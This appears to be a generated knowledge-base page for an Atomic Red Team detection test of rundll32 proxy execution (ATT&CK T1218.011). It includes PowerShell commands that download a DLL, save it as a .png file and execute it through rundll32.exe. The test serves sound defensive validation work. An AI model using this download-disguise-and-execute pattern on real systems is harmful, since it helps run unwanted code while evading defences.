---
atomic_guid: "ae3a8605-b26e-457c-b6b3-2702fd335bac"
title: "Execution of non-dll using rundll32.exe"
framework: "atomic"
generated: "true"
attack_technique_id: "T1218.011"
attack_technique_name: "Signed Binary Proxy Execution: Rundll32"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.011/T1218.011.yaml"
build_date: "2026-04-27 19:12:27"
executor: "powershell"
aliases:
  - "ae3a8605-b26e-457c-b6b3-2702fd335bac"
  - "Execution of non-dll using rundll32.exe"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

Rundll32.exe running non-dll

## ATT&CK Mapping

- [[kb/attack/techniques/T1218-system_binary_proxy_execution#^t1218011-rundll32|T1218.011: Rundll32]]

## Input Arguments

### input_file

- description: Non-dll file
- type: string
- default: C:\Users\$env:username\Downloads\calc.png

### input_url

- description: Url to download the DLL
- type: url
- default: https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1047/bin/calc.dll

## Dependencies

Non-dll file must exist on disk at specified location

### Prerequisite Check

```powershell
if (Test-Path #{input_file}) {exit 0} else {exit 1}
```

### Get Prerequisite

```powershell
Invoke-WebRequest "#{input_url}" -OutFile "#{input_file}"
```

## Executor

- name: powershell

### Command

```powershell
rundll32.exe #{input_file}, StartW
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.011/T1218.011.yaml)
